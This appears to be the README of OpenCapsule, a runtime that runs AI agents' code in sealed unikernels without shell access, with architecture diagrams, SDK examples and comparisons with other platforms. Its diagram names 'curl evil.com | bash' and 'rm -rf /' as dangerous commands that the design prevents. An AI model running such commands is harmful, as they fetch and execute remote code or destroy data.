# OpenCapsule

**Secure Code Execution for AI Agents**

> OpenCapsule is in active development. An alpha release will be available for testing soon.

OpenCapsule is an open-source runtime for AI agent code execution. It combines unikernels with MicroVMs to achieve sub-second cold starts with hardware-level isolation — without giving AI agents dangerous shell access.

## The Problem

Current "agentic" AI solutions treat AI agents like human users—giving them shell access inside containers. This is fundamentally dangerous:

- AI hallucinations can execute destructive commands
- Prompt injection attacks can trick agents into running exploits
- Supply chain attacks via compromised packages affect the entire system
- Unrestricted network egress enables data exfiltration

**The shell is the wrong abstraction for AI agents.** They need to execute code, not operate environments.

## The OpenCapsule Solution

OpenCapsule enforces a **Planner/Executor separation**: AI agents generate code manifests, which are compiled into sealed single-purpose unikernels with:

- **No shell** (`/bin/bash` doesn't exist)
- **No package manager** (all deps are build-time only)
- **No process spawning** (single-process architecture)
- **No arbitrary network access** (allowlist-only egress)

```
┌─────────────────────────────────────────────────────────────┐
│  Traditional (Dangerous)       │  OpenCapsule (Safe)           │
├────────────────────────────────┼────────────────────────────┤
│  AI Agent                      │  AI Agent (Planner)        │
│      │                         │      │                     │
│      ▼                         │      ▼                     │
│  Container with Shell          │  Dockerfile + Manifest     │
│  ├── pip install ✓             │      │                     │
│  ├── curl evil.com | bash ✗    │      ▼                     │
│  └── rm -rf / ✗                │  Sealed Unikernel          │
│                                │  (no shell, no escape)     │
└────────────────────────────────┴────────────────────────────┘
```

## Key Features

| Feature | Benefit |
|---------|---------|
| **Unikraft Unikernels** | 1-5MB images instead of gigabytes |
| **KVM Isolation** | Hardware-level security, not software sandboxes |
| **Content-Addressable Caching** | 99% cache hit rate for common stacks |
| **Ephemeral Builder VMs** | Secure builds without trusting user code |
| **Sub-second Cold Starts** | 200-500ms with sealed unikernel images |
| **E2E Encryption** | XChaCha20-Poly1305 with per-job ephemeral keys |

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                   USER / AI AGENT                            │
└─────────────────────┬───────────────────────────────────────┘
                      │ HTTP REST API
                      ▼
┌─────────────────────────────────────────────────────────────┐
│              LAYER 3: API PLANE                             │
│         HTTP + E2E Encryption (XChaCha20-Poly1305)          │
│      Job Submission · Status Polling · Result Delivery      │
└─────────────────────┬───────────────────────────────────────┘
                      ▼
┌─────────────────────────────────────────────────────────────┐
│              LAYER 2: EXECUTION PLANE                       │
│         Firecracker MicroVMs + Unikraft Unikernels          │
│      Ephemeral Builders · Content-Addressed Cache           │
└─────────────────────┬───────────────────────────────────────┘
                      ▼
┌─────────────────────────────────────────────────────────────┐
│              LAYER 1: ISOLATION PLANE                       │
│              KVM Hardware Virtualization                     │
│       Per-Job MicroVMs · Allowlist Egress · No Shell        │
└─────────────────────────────────────────────────────────────┘
```

## Quick Start

```typescript
import { Client } from '@opencapsule/sdk';

const client = await Client.create({
  secretKey: mySecretKey,       // Your Ed25519 secret key (32 bytes)
  channelId: channelId,         // Shared channel identifier (32 bytes)
  workerPubkey: workerPubkey,   // Worker's Ed25519 public key (hex)
  workerUrl: 'http://worker:3000',
});

const result = await client.run({
  code: `
const numbers = [1, 2, 3, 4, 5];
const sum = numbers.reduce((total, n) => total + n, 0);
console.log(JSON.stringify({ sum }));
`,
  resources: { vcpu: 1, memoryMb: 512 },
  runtime: 'node:24',
});

const outputText = new TextDecoder().decode(result.output);
console.log(outputText); // {"sum": 15}
```

For more complex jobs with egress allowlists and higher resources:

```typescript
const result = await client.run({
  code: `
import pandas as pd
import json, sys
data = pd.read_csv('/dev/stdin')
print(json.dumps({"rows": len(data), "columns": list(data.columns)}))
`,
  input: Buffer.from(csvData),
  resources: { vcpu: 2, memoryMb: 2048 },
  networking: {
    egressAllowlist: [{ host: 'api.openai.com', port: 443 }],
  },
  timeoutMs: 60000,
  runtime: 'python:3.12',
});

console.log(new TextDecoder().decode(result.output));
```

## Technical Stack

| Component | Technology | Purpose |
|-----------|------------|---------|
| API | Axum (HTTP REST) | Job submission, management |
| Compute | Firecracker | MicroVM runtime |
| Unikernels | Unikraft | Dockerfile → minimal kernel |
| Encryption | XChaCha20-Poly1305 | Per-job E2E encryption |
| Signatures | Ed25519 | Identity, key derivation |
| Hashing | BLAKE3 | Content addressing |

## Comparison

| Feature | Cloudflare Workers | Northflank Sandboxes | AWS Lambda | OpenCapsule |
|---------|-------------------|---------------------|------------|----------|
| Cold Start | <1ms | <1s | 100-500ms | **200-500ms** |
| Isolation | V8 Isolate | MicroVM (Kata/gVisor) | Container | **MicroVM + Unikernel** |
| Runtimes | JS/WASM only | Any language | Many (containers) | **Python, Node, Bun** |
| Shell Access | No | Yes | Yes (risky) | **No (by design)** |
| Network Egress | Unrestricted | Configurable | Unrestricted | **Allowlist only** |
| Arbitrary Binaries | No | Yes | Yes | **Yes (build-time)** |
| E2E Encryption | No | No | No | **Yes (per-job keys)** |
| Self-Hostable | No | Yes (BYOC) | No | **Yes** |
| Vendor Lock-in | Cloudflare | Northflank | AWS | **No** |

### OpenCapsule vs Cloudflare Workers

Cloudflare Workers are fast and globally distributed, but they run inside V8 isolates—a software sandbox sharing a process with other tenants. This means:

- **JS/WASM only**: No Python, no native binaries, no `ffmpeg`, no ML frameworks. OpenCapsule runs full unikernels with any statically-linked binary.
- **Software isolation**: V8 isolates rely on the V8 engine for security. A V8 bug = tenant escape. OpenCapsule uses KVM hardware virtualization—each job gets its own virtual machine.
- **Not designed for AI agents**: Workers are built for HTTP middleware (rewrite headers, transform responses). OpenCapsule is built for compute jobs: run a Python script, process data, call an API, return a result.
- **Centralized**: You can't run Cloudflare Workers on your own hardware. OpenCapsule workers run anywhere with KVM support.
- **No filesystem**: Workers have no persistent or temporary filesystem. OpenCapsule unikernels get a full (ephemeral) filesystem with your code and dependencies baked in at build time.

### OpenCapsule vs Northflank Sandboxes

Northflank Sandboxes use Kata/gVisor MicroVMs — similar hardware isolation to OpenCapsule. But the security model is fundamentally different:

- **Shell access**: Northflank sandboxes run full Linux with shells, package managers, and process spawning. OpenCapsule unikernels have none of these — the attack surface is structurally eliminated, not just restricted.
- **Image size**: Northflank runs standard container images (hundreds of MB to GB). OpenCapsule unikernels are 1-5MB, enabling sub-second cold starts from content-addressed cache.
- **E2E encryption**: OpenCapsule encrypts all job I/O with per-job ephemeral keys (XChaCha20-Poly1305). Code and results are encrypted in transit and at rest. Northflank does not provide per-job encryption.
- **Open source**: OpenCapsule is AGPL-3.0. Northflank is proprietary.

## Roadmap

- **Q1 2026**: Engine—Single-node worker, HTTP API, Firecracker + Unikraft
- **Q2 2026**: Platform—Multi-worker orchestration, SDK release, managed service
- **Q3 2026**: Scale—GPU support, confidential compute (TEE), enterprise features

## Documentation

- [Whitepaper](docs/WHITEPAPER.md) — Full technical specification
- [Development Guide](docs/DEVELOPMENT.md) — Running E2E tests locally

## Security Model

OpenCapsule provides triple-layer isolation:

| Layer | Component | Protection |
|-------|-----------|------------|
| Build | Ephemeral Builder VM | Prevents host compromise during `RUN` commands |
| Storage | Content Addressing | Prevents poisoned image attacks |
| Runtime | KVM Virtualization | Prevents guest-to-host escape |

## License

GNU Affero General Public License v3.0

---

*For technical questions: developers@opencapsule.dev*
*For partnerships: partners@opencapsule.dev*
